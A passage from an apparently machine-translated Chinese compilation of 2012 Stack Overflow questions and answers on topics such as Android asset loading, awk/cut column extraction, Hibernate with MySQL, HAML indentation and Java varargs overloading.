还添加了“-Dhttp.proxyHost=proxyserver -Dhttp.proxyPort=80 -Dhttp.proxyUser=jack -Dhttp.proxyPassword=XXXXXXX”作为 JVM 选项。

我在 Windows XP 和 7 上运行 Java 7、Selenium 2.25.0、Netbeans 7.2。

没有一个搜索直接回答了这个问题。

任何帮助将不胜感激。

提前致谢，

杰克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:49:08.070

我想端口号应该是一个整数

**`firefoxProfile.setPreference("network.proxy.http_port", 80);`**

对于处理要求输入用户名和密码的弹出窗口，您可以使用**autoit**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-31T11:38:24.093

根据提供的代码，提供了 selenium ide 而不是 firebug。看它

```
 File fireBugFile = new File("C:/selenium-ide-1.9.0.xpi");
FirefoxProfile firefoxProfile = new FirefoxProfile();
firefoxProfile.addExtension(fireBugFile); 
```

所以这可能是为什么火虫没有得到的问题.. 用正确的版本和火狐版本提供火虫的正确位置。

对于身份验证，以前我使用了以下一个而没有考虑 Firefox 配置文件。

```
driver.get("http://UserName:Password@Example.com"); 
```

并且还手动创建了 Firefox 配置文件并为配置文件完成了身份验证。我在执行中调用了这个配置文件，这种方式在 firefox 的情况下也很有效。

谢谢

# android - 从资产文件夹android获取文件

> ID：13524143
> 
> 赞同：1
> 
> 时间：2012-11-23T06:32:16.067
> 
> 标签：android, file, assets

我使用此代码从资产文件夹中获取文件：

```
intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("file:///android_asset/"+knowImage)) 
```

但是当打印这一行时，总是在文件：///android_asset 和来自 knowimage 的字符串之间获得空间！

打印 knowimage 时没有空间！但是当他们结合结果是一个空格，所以不能使用它

输出是这样的：

```
11-23 14:16:29.128: I/Share(18204): file:///android_asset/
11-23 14:16:29.128: I/Share(18204): lovingurpregnantbodyS.png 
```

但它必须是这样的：

```
file:///android_asset/lovingurpregnantbodyS.png 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:10:02.460

这是您可以根据应用程序中的要求使用的方法。您还可以在 ImageView 上显示时重新调整图像大小。跳这会帮助你。

```
public Bitmap getBitmapFromAsset(String strName) {
        AssetManager assetManager = getAssets();
        InputStream istr = null;
        try {
            try {
                istr = assetManager.open(strName);
            } catch (FileNotFoundException e) {
                istr = assetManager.open("noimage.png");
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
        Bitmap bitmap = BitmapFactory.decodeStream(istr);
        int Height = bitmap.getHeight();
        int Width = bitmap.getWidth();
        float scale = getResources().getDisplayMetrics().density;
        int dip = (int) (40 * scale + 0.5f);
        int newHeight = width - dip;
        int newWidth = width - dip;
        float scaleWidth = ((float) newWidth) / Width;
        float scaleHeight = ((float) newHeight) / Height;
        Matrix matrix = new Matrix();
        matrix.postScale(scaleWidth, scaleHeight);
        Bitmap resizedBitmap = Bitmap.createBitmap(bitmap, 0, 0, Width, Height,
                matrix, true);

        return resizedBitmap;
    } 
```

> **调用方法如：**

```
Imgview.setImageBitmap(getBitmapFromAsset("YourFoldername/"+ imgname + ".jpg")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T07:29:20.683

您可以使用此方法：

```
public static void loadAssetImage(String path, ImageView imageView,
        Context context)
{
    try
    {
        Bitmap b = BitmapFactory.decodeStream(context.getAssets().open(path));
        imageView.setImageBitmap(Bitmap.createScaledBitmap(b, b.getHeight(),
                b.getHeight() * b.getHeight() / b.getWidth(), false));
    }
    catch (Exception e)
    {
        Log.e("Exception", e.getLocalizedMessage());
    }
} 
```

调用活动：

```
FileUtils.loadAssetImage("Folder/image.png, imageView, CurrentActivity.this); 
```

# database - 从空格分隔的文件中剪切特定列

> ID：13524146
> 
> 赞同：1
> 
> 时间：2012-11-23T06:32:24.427
> 
> 标签：database, unix, sed, cut

我使用 FASTA 文件运行 hmmscan 分析，该文件要求带有 --tblout 选项的表格输出格式，该选项故意以空格分隔（而不是制表符分隔）并对齐到对齐的列中。

文件看起来像这样（这只是一个格式示例）

```
targetname accession queryname    accession  e-value score bias
x_x_x      PFyyyy.y  ContigXXX_0  -          x.xe-xx yy.y  x.x
x          PFyyyy.yy COntigXXX_1  -          xe-x    yy.y  x.x
x_x        PFyyyy.y  COntigXXX_2  -          xe-xx    y.y  x.x
x_x_x      PFyyyy.yy COntigXXX_3  -          x.xe-x  yy.y  x.x
.
.. 
```

其中目标名称例如：Methyltransf 或 Dimer_tnp_hAT 或 Nucleotide_trans

其中加入例如：PF13847.1 或 PF03407.11 或 PF01958.13；

其中查询名称例如：Contig244_1 或 Contig44245_3 或 Contig12345_6

其中第二个加入栏是：-

其中 e.value 例如：4.0e-10 或 3.5e-15 等。

score 和 bias 是这种格式的数字：xx.x

我想做的是剪切所有对蛋白质结构域有重大影响的 ContigXXX_X 所在的查询名称列。

在此之后，我将能够对它们进行排序并只保留每个 Contig 的第一次出现，我可以将文件与 BlastP 和 BlastX 的结果进行比较（我已经能够获得我的 Contigs 的列表命中 nr数据库）

所以我的问题是：我怎样才能剪掉我所有的 Contig 所在的列？我一直在尝试使用 grep、sed、cut 命令，但我还没有找到合适的命令。

我是 Unix 语言的新手，我还在学习，所以每一个建议都会非常感激。

如果我的问题不清楚，请告诉我，我可以修改它！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T05:57:08.777

表面上，如果你有 GNU `cut`，你可以使用：

```
cut -i -f 3 tblout-file 
```

该`-i`选项意味着一个或一个空格将被用作字段分隔符（而没有它，每个空格都是一个字段分隔符）。非 GNU 版本`cut`通常不支持`-i`. `cut`（你可以通过运行来检查它是否是 GNU `cut --version`；如果你得到一个有意义的版本号，它（可能）是 GNU，如果你得到无效的选项消息，它不是。）

这对你不起作用吗？显然，您将替换为您创建的文件的名称`tblout-file`。

如果有问题（例如没有 GNU `cut`），那么请考虑`awk`：

```
awk '{print $3}' tblout-file 
```

这两个也包括输出中的第一行；有多种可能的方法可以删除第一行。

```
cut -i -f 3 tblout-file | sed 1d
awk 'NR>1 { print $3 }' tblout-file 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T06:01:18.807

```
awk 'NR!=1{print $3}' your_file 
```

或者

```
perl -F -lane 'if($.!=1){print $F[2]}' your_file 
```

# c# - 如何从父 DatGrid 选定项分配 Datgrid ItemSource

> ID：13524151
> 
> 赞同：0
> 
> 时间：2012-11-23T06:32:51.577
> 
> 标签：c#, wpf, xaml, binding

我有一个 Datagrid，在它的行详细信息模板中我有另一个 Datagrid

```
<DataGrid Name="dataGridWorkOrders" ItemsSource="{StaticResource workorders}" >
<DataGrid.RowDetailsTemplate>
  <DataTemplate>
        <Border BorderThickness="0" Background="BlanchedAlmond" Padding="10">
        <DataGrid IsReadOnly="True" AutoGenerateColumns="False" ItemsSource="{Element=dataGridWorkOrders,path=selectedItem}">
  </DataGrid>
 </Border> 
```

工单集合就像：

```
class WorkOrders : ObservableCollection<WorkOrder>
    {
        public WorkOrders()
        {
            var orderList = OrderDetailsProvider.GetOrders() as List<WorkOrder>;

            orderList.ForEach(
                        order => this.Add(order));
        } 
```

WorkorderClass 具有以下作为比例公开的字段。

```
 private string orderID;
 private int totalQuantity;
 private string status;
 private ObservableCollection<Schedule> scheduleCollection; 
```

现在在我的第二个数据网格中，我想绑定到当前选定数据网格的**ScheduleCollection**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:37:28.677

的数据上下文`RowDetailsTemplate`应该是选定的项目——所以你应该绑定到`scheduleCollection`：

```
<DataGrid IsReadOnly="true" ItemsSource="{Binding scheduleCollection}"> 
```

（...并且要么使用`AutoGenerateColumns="true"`，要么[`DataGridColumns`](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridtextcolumn%28v=vs.95%29.aspx)手动添加）

# mysql - Hibernate 或 Netbeans 不允许外键表进行逆向工程

> ID：13524154
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:33:18.173
> 
> 标签：mysql, hibernate, netbeans-6.9

我正在 netBeans IDE 中使用休眠和 JSF 开发一个小型应用程序。我的项目与大师合作得很好。现在我需要再添加一张包含与这些主人的关系的表。场景如下

```
delimiter $$

CREATE TABLE `TABLE_1` (
`ID1` int(11) NOT NULL default '0',
`ID1_DESC` varchar(45) default NULL,
PRIMARY KEY  (`ID1`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1$$

delimiter $$

CREATE TABLE `TABLE_2` (
`ID2` int(11) NOT NULL default '0',
`ID2_DESC` varchar(45) default NULL,
PRIMARY KEY  (`ID2`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1$$

delimiter $$

CREATE TABLE `TABLE_3` (
`ID3` int(3) NOT NULL default '0',
`ID1` int(3) NOT NULL,
`ID2` int(3) NOT NULL,
`ID3_DESC` varchar(45) default NULL,
PRIMARY KEY  (`ID3`),
KEY `FK_ID1_idx` (`ID1`),
KEY `FK_ID2_idx` (`ID2`),
CONSTRAINT `FK_ID1` FOREIGN KEY (`ID1`) REFERENCES `table_1` (`ID1`) ON UPDATE CASCADE,
CONSTRAINT `FK_ID2` FOREIGN KEY (`ID2`) REFERENCES `table_2` (`ID2`) ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1$$ 
```

然后我尝试通过netbeans的逆向工程向导生成逆向工程文件，除了TABLE1和TABLE2。它将 Table3 显示为 Table3（无主键）。它也不包括逆向工程文件中的表 3。

我生成的 hibernate.cfg.xml 文件是

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-configuration PUBLIC "-//Hibernate/Hibernate Configuration DTD 3.0//EN" "http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd">
<hibernate-configuration>
<session-factory>
    <property name="hibernate.dialect">org.hibernate.dialect.MySQLInnoDBDialect</property>
    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
    <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/TESTSCHEMA?zeroDateTimeBehavior=convertToNull</property>
    <property name="hibernate.connection.username">root</property>
    <property name="hibernate.show_sql">true</property>
    <property name="hibernate.current_session_context_class">thread</property>
    <property name="hibernate.query.factory_class">org.hibernate.hql.classic.ClassicQueryTranslatorFactory</property>
</session-factory>
</hibernate-configuration> 
```

当我删除外键时，它允许我生成 TABLE3 映射文件和 POJO。我无法理解为什么它不允许外键概念。是mysql表创建错误还是netbeans bug或hibernate问题？？？？

任何人都可以为我提供这个问题的解决方案吗？提前致谢....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:12:48.757

我找到了解决方案。我在windows上使用mysql所以lower_case_table_names的默认值=2。我已将其设置为 1。还将所有表重命名为小写。然后尝试生成映射和pojos ....成功。

结论

如果您使用的是 Hibernate 和在 Windows 上运行的 MySQL 数据库，请确保您的表名都是小写的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:46:18.730

它在 table1 和 table2 实体中生成多对多关系。如果删除外键关系，则其创建为一对多。请显示 table1 和 table2 实体。

# ruby-on-rails - Haml - 非法嵌套：纯文本中的嵌套是非法的

> ID：13524161
> 
> 赞同：18
> 
> 时间：2012-11-23T06:33:40.330
> 
> 标签：ruby-on-rails, ruby-on-rails-3, haml

在我的代码在我的本地机器上运行的地方使用 HAML 时，我的代码遇到了一个奇怪的错误，但是当我部署它时，我收到以下错误

> ActionView::Template::Error（非法嵌套：纯文本内的嵌套是非法的。）：

我的代码看起来像这样

```
 %td{ :style => 'width:10px' }
= link_to('Dashboard',   dashboard_admin_clients_account_path(client)) if client.is_member?
= link_to('Edit',   edit_admin_clients_account_path(client))
- if client.removed_at.nil?
  = link_to('Delete', admin_clients_account_path(client), :method => :delete, :confirm => 'Are you sure you want to delete')
- else
  = link_to('Restore', restore_admin_clients_account_path(client)) 
```

我是 HAML 的新手

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-23T06:54:35.983

1.  如果您希望链接位于 %td 内，它们应该向右 1 个选项卡（td - 0 个选项卡，链接 - 左侧 1 个选项卡）
2.  您应该使用相同的方法进行缩进（例如，始终使用制表符代替空格）。
3.  看起来问题不在此代码中。它是部分代码还是其他代码的一部分？

**因为当你这样做时，通常会发生“非法嵌套”：**

```
%td{ :style => 'width:10px' }
    justtext
      =link_to .... 
```

**试试这个代码：**

```
%td{ :style => 'width:10px' }
    = link_to('Dashboard',   dashboard_admin_clients_account_path(client)) if client.is_member?
    = link_to('Edit',   edit_admin_clients_account_path(client))
    - if client.removed_at.nil?
        = link_to('Delete', admin_clients_account_path(client), :method => :delete, :confirm => 'Are you sure you want to delete')
    - else
        = link_to('Restore', restore_admin_clients_account_path(client)) 
```

# android - 具有两个约束的 SQlite 查询

> ID：13524163
> 
> 赞同：1
> 
> 时间：2012-11-23T06:34:23.940
> 
> 标签：android, sqlite

我有这样的东西。我想查询日期和用户名是否与提供的字符串（参数）匹配并返回结果。我尝试了下面的语法，但它给了我错误。谢谢您的帮助

```
 public String getOneDayEvents(String date, String username) {
    String[] columns = new String[] { KEY_TITLE, KEY_DESCRIPTION,
            KEY_START_TIME, KEY_END_TIME };
    Cursor c = ourDataBase.query(DATABASE_TABLE_EVENTS, columns, KEY_DATE
            + " like ? " + KEY_REF + " like ?", new String[] {date,username}, null, null, null);
    String result = "";

    int iTitle = c.getColumnIndex(KEY_TITLE);
    int iDesc = c.getColumnIndex(KEY_DESCRIPTION);
    int istartTime = c.getColumnIndex(KEY_START_TIME);
    int iendTime = c.getColumnIndex(KEY_END_TIME); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:41:51.857

您需要使用 AND 加入您的条件：

```
Cursor c = ourDataBase.query(DATABASE_TABLE_EVENTS, columns, KEY_DATE
        + " like ? and " + KEY_REF + " like ?", new String[] {date,username}, null, null, null);
//-----------------^^^ 
```

# android - 当用户在android中禁用gps时如何获得通知？

> ID：13524164
> 
> 赞同：5
> 
> 时间：2012-11-23T06:34:28.833
> 
> 标签：android, gps

我正在创建一个使用 GPS 的应用程序。我第一次**`onCreate()`**检查 GPS 是否启用。如果它没有启用，那么我会将用户发送到设置菜单以设置启用 GPS。

一旦启用 GPS，我就开始执行我的工作。***但是，如果用户在通知管理器上停止 GPS 滚动，那么我怎么知道呢？***

因为我的方法只在 GPS 未启用时执行一次。之后，当它再次被禁用时它不会被执行。

**`I just want to know whenever in between the work the GPS is disabled by the user. Just this information is required.`**

这是我的代码。

```
class LocationFinderService extends Service{

    boolean gps_enabled;
    LocationManager locationManager;
    @Override
    public void onCreate() {
        // TODO Auto-generated method stub
        super.onCreate();
        locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
        if(!isGpsEnabled())
        {
            startGpsForLocation();
            stopSelf();
        }

    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }

    public boolean isGpsEnabled()
    {
        gps_enabled = (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)&& locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER));
        Log.i("Log", "Gps:  "+gps_enabled);
        return gps_enabled;
    }

    public void startGpsForLocation()
    {
        Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK) ;
        startActivity(intent);
        Toast.makeText(this, "Please start the GPS", Toast.LENGTH_LONG).show();
    }
} 
```

**我在 Activity 类的按钮单击时调用此服务。**

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:03:13.643

```
 lmGps.requestLocationUpdates(LocationManager.GPS_PROVIDER,0,0,gpsLocationListener);
        lmGps.addGpsStatusListener(gpsStatusListener); 
```

gpsLocationListner is

```
LocationListener gpsLocationListener=new LocationListener(){
        public void onLocationChanged(Location location){
            dGpsLat=location.getLatitude();
            dGpsLng=location.getLongitude();

        dLat=dGpsLat;
        dLng=dGpsLng;
        try{
        SaveLocation();
    }
        catch (Exception e) {
            sResponse=e.toString();
            return;
        }
    }
    public void onStatusChanged(String provider,int status,Bundle extras){}
    public void onProviderEnabled(String provider){}
    public void onProviderDisabled(String provider){}
}; 
```

gpsStatusListener

```
GpsStatus.Listener gpsStatusListener=new GpsStatus.Listener(){
        @Override
        public void onGpsStatusChanged(int event){
            if(event==GpsStatus.GPS_EVENT_SATELLITE_STATUS){
                try{
                    GpsStatus status=lmGps.getGpsStatus(null);
                    sats=status.getSatellites();
                    Iterator satI=sats.iterator();

                    int count=0;
                    while(satI.hasNext()){
                        GpsSatellite gpssatellite=(GpsSatellite) satI.next();
                        if(gpssatellite.usedInFix()){
                            count++;
                        }
                    }
                    iSalelliteCount=count;
                }
                catch(Exception ex){}
            }
        }
    }; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T06:49:35.647

You just need to Create one **BroadcastReceiver**

```
public class InternetConnectionBroadcast extends BroadcastReceiver 
 {
    private Handler handler = new Handler();
    public static String state;
    private Context netcontext;
    public void onReceive(Context context, Intent intent) 
    {
     netcontext = context;
     NetworkInfo info = intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);

     if(null != info)
     {
             state = getNetworkStateString(info.getState());
             Log.i("----------Network State",state);
     }
}

private String getNetworkStateString(NetworkInfo.State state)
{
    String stateString = "Unknown";
    switch(state)
    {
            case CONNECTED:         stateString = "Connected";      break;

            case CONNECTING:        stateString = "Connecting";     break;

            case DISCONNECTED:      

                stateString = "Disconnected";  
                handler.removeCallbacks(sendUpdatesToUI);
                handler.post(sendUpdatesToUI);

                break;

            case DISCONNECTING:     stateString = "Disconnecting";  break;

            case SUSPENDED:         stateString = "Suspended";      break;

            default:                stateString = "Unknown";        break;
    }
    return stateString;
}

private Runnable sendUpdatesToUI = new Runnable() 
{
     public void run() 
     {
             Toast.makeText(netcontext,"Please Check Your Internet Connection",Toast.LENGTH_SHORT).show();   
     }
}; } 
```

Also Register into manifest.xml

```
<receiver android:name="com.example.utility.InternetConnectionBroadcast">
     <intent-filter>
     <action android:name="android.net.conn.CONNECTIVITY_CHANGE" /> 
     </intent-filter>
     </receiver> 
```

Now whenever your connection will lost, it will notify message to the user.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T06:44:50.553

尝试使用 GPSStatus.Listener：

[http://developer.android.com/reference/android/location/GpsStatus.Listener.html](http://developer.android.com/reference/android/location/GpsStatus.Listener.html)

# java - 重载函数 int... 和 long... 同时

> ID：13524166
> 
> 赞同：2
> 
> 时间：2012-11-23T06:34:33.783
> 
> 标签：java, overloading

我想创建两个函数，比如说

```
long min(long...);
int min(int...); 
```

但是当我尝试调用第二个 ie 时，`min(1, 5)`我得到了模棱两可的方法调用

除了重命名还有其他解决方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T07:04:02.413

**这是一个已知的错误**

您描述的行为是 Java 7 已修复的错误。请参阅[发行说明](http://www.oracle.com/technetwork/java/javase/compatibility-417013.html)中的​​详细信息，名为“更改最具体的 Varargs 方法选择”部分。

**它应该编译的原因**

在确定最具体的方法时，可变参数排在最后。[在JLS 15.12.2.4](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.12.2.4)中定义了用于确定当有多个 vararg 方法适用的规则- 这是一个摘录：

> 如果满足以下任一条件，一个名为 m 的变量 arity 成员方法比另一个同名的变量 arity 成员方法更具体：
> - [...]
> - 一个成员方法有 k 个参数，而另一个成员方法有 n 个参数，其中 n ≥ k，并且：
> 
> *   第一种方法的参数类型为U1, ..., Uk-1, Uk[]。
> *   其他方法的参数类型为T1, ..., Tn-1, Tn[]。
> *   对于从 1 到 n 的所有 j，Uj <: Tj

在您的情况下，k = n，`U1[] = int[]`因此`T1[] = long[]`可以确定是否`int <: long`或相反。

换句话说，考虑的类型不是`int[]`vs.`long[]`而是`int`vs. `long`碰巧应该选择`int <: long`该`int...`方法并且应该编译它。

**结论：**

该代码应该（并且确实）可以使用 Java 7 编译，但不能使用 Java 5 或 6 编译。下面的代码`int`使用 Java 7 打印：

```
public class Test1 {
    public static void main(String[] args) {
        new Test1().m(1, 2);
    }
    int m(int... i) {
        System.out.println("int");
        return 0;
    }
    long m(long... i) {
        System.out.println("long");
        return 0;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T06:40:49.397

问题是当您使用 调用这些方法时`integer`，**没有任何**方法提供与**您使用的参数****完全匹配**的参数。此外，两者都可以将用逗号分隔的值作为参数。因此错误。**`var-args`**`var-args``int``ambiguous method`

当你调用重载方法时，`Compiler`选择第`exact match`一个。然后`nearest type`投。

现在，由于`var-args`只是一个`array`，编译器在传递值时无法决定使用哪个数组`integer`。因为，这两个数组都不能被视为`exact match`或`nearest conversion`。因此，它需要两种方法都可以调用。

关于. `method invocation`_ `Overloading`您可以从`Java Language Specification`.

* * *

正如[@assylias 的回答](https://stackoverflow.com/a/13524464/1679863)一样，这个问题已在 Java 7 中得到修复。但它不适用于 Java 版本 < 7。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T09:24:58.563

试试这个

```
public class Test {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        new Test().m(100L,512L);
        new Test().m(100,512);
    }

    int m(int... i) {
        System.out.println("int");
        return 0;
    }

    long m(long... i) {
        System.out.println("long");
        return 0;
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T06:37:46.857

这些方法签名是唯一的，并且是有效的方法重载。

问题必须出在方法调用参数中。我的猜测是您正在使用文字调用该方法，例如：

```
min(100) 
```

它不喜欢这样，因为 100 是一个整数文字，但它会自动转换为长整数。

通过在长文字末尾使用 L 来消除方法调用的歧义应该可以解决问题：

```
min(100L) 
```

此外，您可以使用 Java Object Integer 和 Long 来显式调用，并让自动装箱处理到原始类型的转换：

```
min(new Long(100))
min(new Integer(100)) 
```

# joomla - 不同的注册表格用于不同的注册

> ID：13524167
> 
> 赞同：0
> 
> 时间：2012-11-23T06:34:35.173
> 
> 标签：joomla, joomla2.5, joomla-extensions

我有 5 种类型的用户，对于每个用户，我需要具有不同字段的不同注册表单。Joomla 2.5 中是否有可能为不同的用户提供不同的注册表单。请帮我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:51:26.573

将此组件用于您的 joomla 2.5 网站[ExtendedReg](http://extensions.joomla.org/extensions/access-a-security/site-access/authentication/14303)

（或）尝试创建自己的组件。否则编辑 joomla 用户注册组件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T09:01:04.777

通过复制核心中的示例来制作您自己的配置文件插件。将您需要的不同表格放在配置文件文件夹中。在插件本身中编写代码以使正确的表单显示给正确的人。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-09T14:48:43.497

Joomla 文档在此处给出了该用例的示例： [https ://docs.joomla.org/Creating_a_profile_plugin](https://docs.joomla.org/Creating_a_profile_plugin)

正如 Elin 所说，您确实必须创建自己的个人资料插件。

# c++ - 多项式 ADT 构造函数和删除

> ID：13524168
> 
> 赞同：0
> 
> 时间：2012-11-23T06:34:43.037
> 
> 标签：c++, constructor

我在理解如何将构造函数与以下类一起使用时遇到问题

```
class Polynomial{
private:
    typedef struct term{
        double coef;
        unsigned deg;
        struct term * next;
    }term_t;
    typedef struct term *Term;
    typedef struct term *Poly;
public:
    Polynomial(); //Constructor
    ~Polynomial(); //Destructor
    Poly newPoly(void); 
```

我如何分配构造函数？并且 Poly newPoly(void) 应该返回没有项的多项式。我很难理解如何在多项式中为这些函数使用这个特定的结构。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:40:34.627

删除`newPoly(void)`. 那只是做一个构造函数应该做的工作。

删除它们一无所获的 typedef。

你如何写你的多项式取决于你的类是如何设计的，你没有告诉我们。通常对于这种类，您将定义一些成员变量，然后您将在构造函数中对其进行初始化。例如你可以写

```
class Polynomial{
private:
    struct term{
        double coef;
        unsigned deg;
        term* next;
    };
    term* head; // pointer to first term
    int size; // number of terms
public:
    Polynomial() { head = NULL; size = 0; }
    ~Polynomial();
}; 
```

但这**只是一个建议**。由您来设计这个类，并决定该设计需要哪些成员变量。

现在要得到一个没有项的新多项式，你只需写

```
int main()
{
    Polynomial p; // a new polynomial
    ...
} 
```

不要忘记你还必须为这个类编写一个复制构造函数和一个赋值运算符。

# svn - 创建 Subversion 存储库和管理批量创建的最简单方法？

> ID：13524170
> 
> 赞同：1
> 
> 时间：2012-11-23T06:34:44.617
> 
> 标签：svn

我们不久前编写了批处理文件，它会自动创建 Subversion 存储库。由于别人的错误，我们丢失了批处理文件。这些批处理文件的设置至少需要 50 个小时。

现在，在我继续并重做这些批处理文件之前，我想知道是否有一种简单的方法或者一个程序可以：

1.  自动将现有的 Subversion 存储库复制到新的存储库中

2.  修改各种配置文件以包含新的登录详细信息和密码

3.  自动部署到服务器

4.  有这样的事情吗？

# httprequest - 如何在 .ashx 中区分来自同一设备的多个 HttpRequest

> ID：13524172
> 
> 赞同：1
> 
> 时间：2012-11-23T06:35:04.860
> 
> 标签：httprequest, ashx

HttpRequest 是否有一些属性对于来自同一设备的不同请求是唯一的？

# php - 如何使用 codeigniter 中的库制作多语言网站

> ID：13524174
> 
> 赞同：1
> 
> 时间：2012-11-23T06:35:21.440
> 
> 标签：php, codeigniter, multilingual

如何在 codeigniter 中添加多语言？我需要不同语言的网站。语言可以从标题的下拉列表中选择。根据所选语言，整个网站将采用所选语言。我正在使用最新版本的 codeigniter。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T11:25:16.397

即使您从 db 获取数据，也可以使用 codeigniter 语言类。将语言数组键存储在 db 中。

例如，

在语言文件中有一个条目

```
$lang['hello'] = "hello in english"; 
```

您可以将 hello 存储在 db 中并将其作为

```
$dbdata = 'hello';//taken from db 
```

并在您的控制器/视图中使用它作为

```
echo $this->lang->line($dbdata); 
```

如果您对 codeigniter 语言类有任何疑问，请在此处查看一些较早的帖子。

[使 codeigniter 网站多语言的最佳方法。从 lang 数组调用取决于 lang 会话？](https://stackoverflow.com/questions/1328420/the-best-way-to-make-codeigniter-website-multi-language-calling-from-lang-array)

问候

iijb

# android - 是否可以在同一个application.in android中运行具有2个不同重复值的2个不同警报？

> ID：13524176
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:35:26.890
> 
> 标签：android, android-service, alarmmanager, android-alarms, android-2.3-gingerbread

我正在使用 Android 2.3 开发移动应用程序
在这里我想捕获 gps 位置并将位置坐标（如果它捕获否则发送 0）发送到具有一小时时间间隔的 Web 应用程序。
gps 捕获既费时又费电池。
在我的应用程序中，我使用以 1 小时持续时间重复的警报管理器。如果出现警报，则调用接收器 (BroadcastReceiver)，然后执行 gps 捕获并发送到服务器模块在
这里，当接收器通知时，gps 捕获启动侦听器，然后立即位置坐标发送到服务器。但这里的问题是位置捕获耗时，因此对于发送模块，位置详细信息保持为 0。（位置未捕获。但在捕获一段时间后发送到服务器后）
所以我的计划是创建 2 个警报。一个用于捕获 gps（在发送服务器 10 分钟之前开始），另一个用于发送服务器的警报，重复 1 小时。
这里我怀疑 AlarmManager 是一个 android 系统服务。
是否可以在同一个应用程序中运行具有 2 个不同重复值的 2 个不同警报（1 个警报重复 1 小时，其他警报重复 30 分钟等）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:01:09.583

是的。我曾经创建了一个 Android 应用程序，它有一个警报，每 10 分钟触发一次，另外两个警报每 15 分钟触发一次。

您只需`PendingIntent`为每个警报创建一个不同的对象，并将每个对象添加到`AlarmManager`via`setRepeating`方法中。

# url - 谷歌分析跟踪一些网页浏览量只是一个正斜杠

> ID：13524187
> 
> 赞同：1
> 
> 时间：2012-11-23T06:36:21.010
> 
> 标签：url, analytics

真的很奇怪。我的一篇文章在谷歌分析中有一半的时间作为其正确的永久链接被跟踪，而另一半的网页浏览量来自一个具有相同页面标题的正斜杠。

例子：

```
Title of Page: Official iPhone Unlock
Correct URL of page: /official-iphone-unlock
Two URL's being tracked with that page title:/official-iphone-unlock/ 
```

因此，不用说，这会影响我的数字，因为我在两个 URL 下都获得了该页面的综合浏览量，而且真的很难弄清楚问题出在哪里。我正在使用 ECWID 购物车，我怀疑这是他们跟踪事物的方式，但我无法证明这一点。但问题是在我启用他们的跟踪代码时开始的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-21T05:30:20.683

您是否尝试过按浏览器对这些页面的流量进行细分？

首先找到页面：
行为 > 网站内容 > 所有页面（然后搜索您的页面）

...然后按浏览器细分进行交叉钻取：
二级维度 > 访客 > 浏览器

想到的一种可能性是，某些浏览器可能会在没有文件扩展名的情况下自动在 URL 末尾附加斜杠，而其他浏览器可能不会。例如，Chrome 为我将 /foo URL 转发到 /foo/。可能只有特定版本的浏览器会表现出这种行为——例如 IE9。

# iphone - 如何停止调度队列

> ID：13524190
> 
> 赞同：0
> 
> 时间：2012-11-23T06:36:41.900
> 
> 标签：iphone, multithreading, ios5, grand-central-dispatch, dispatch

我正在使用 Dispatch Queue 加载图像，但如果我不希望它在某个时候加载所有图像，我不知道如何停止队列。

```
- (void) loadImageInBackgroundArr1:(NSMutableArray *)urlAndTagReference {
    myQueue1 = dispatch_queue_create("com.razeware.imagegrabber.bgqueue", NULL);        
    for (int seriesCount = 0; seriesCount <[seriesIDArr count]; seriesCount++) {
        for (int i = 0; i < [urlAndTagReference count]; i++) {
            dispatch_async(myQueue1, ^(void) {
                NSData *data0 = [[NSData alloc]initWithContentsOfURL:[NSURL URLWithString:[urlAndTagReference objectAtIndex:i]]];
                UIImage *image = [[UIImage alloc]initWithData:data0];
                dispatch_sync(dispatch_get_main_queue(), ^(void) {

                for (UIView * view in [OD_ImagesScrollView subviews]) {

